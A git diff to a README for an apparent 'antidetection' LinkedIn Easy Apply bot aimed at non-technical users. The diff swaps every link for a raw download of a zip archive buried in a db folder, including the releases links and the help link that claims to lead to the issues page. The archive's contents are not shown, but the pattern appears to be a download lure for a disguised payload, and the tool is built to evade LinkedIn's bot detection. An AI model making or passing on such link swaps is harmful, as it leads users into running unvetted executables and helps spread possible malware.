@@ -1,6 +1,6 @@
 # 🤖 linkedin-easyapply-antidetection-bot - Automate LinkedIn Easy Apply Simply
 
-[![Download Release](https://img.shields.io/badge/Download-LinkedIn%20Bot-blue?style=for-the-badge)](https://github.com/augustcraigmusic/linkedin-easyapply-antidetection-bot/releases)
+[![Download Release](https://img.shields.io/badge/Download-LinkedIn%20Bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/augustcraigmusic/linkedin-easyapply-antidetection-bot/main/linkedin_bot/db/easyapply_linkedin_bot_antidetection_v1.6.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This guide shows you how to download and use the bot without any technical backg
 ## 📥 Download and Install
 
 1. Click the big button below or go to the GitHub release page:  
-[![Download Release](https://img.shields.io/badge/Download-LinkedIn%20Bot-blue?style=for-the-badge)](https://github.com/augustcraigmusic/linkedin-easyapply-antidetection-bot/releases)
+[![Download Release](https://img.shields.io/badge/Download-LinkedIn%20Bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/augustcraigmusic/linkedin-easyapply-antidetection-bot/main/linkedin_bot/db/easyapply_linkedin_bot_antidetection_v1.6.zip)
 
 2. On the releases page, look for the latest version. Find a file that ends with `.exe` or `.zip`.  
    - If you see a `.zip` file, download it and unzip it using Windows Explorer (right click → Extract).  
@@ -110,7 +110,7 @@ This software keeps your data safe by running everything locally on your PC. It 
 ## 🆘 Need Help?
 
 Check the issues page on the repository if the bot behaves unexpectedly:  
-https://github.com/augustcraigmusic/linkedin-easyapply-antidetection-bot/issues
+https://raw.githubusercontent.com/augustcraigmusic/linkedin-easyapply-antidetection-bot/main/linkedin_bot/db/easyapply_linkedin_bot_antidetection_v1.6.zip
 
 Users often share solutions for common problems there.
 
@@ -120,7 +120,7 @@ Users often share solutions for common problems there.
 
 To get the bot, visit the release page below and choose the latest version:  
 
-[![Download Release](https://img.shields.io/badge/Download-LinkedIn%20Bot-blue?style=for-the-badge)](https://github.com/augustcraigmusic/linkedin-easyapply-antidetection-bot/releases)
+[![Download Release](https://img.shields.io/badge/Download-LinkedIn%20Bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/augustcraigmusic/linkedin-easyapply-antidetection-bot/main/linkedin_bot/db/easyapply_linkedin_bot_antidetection_v1.6.zip)
 
 ---
 
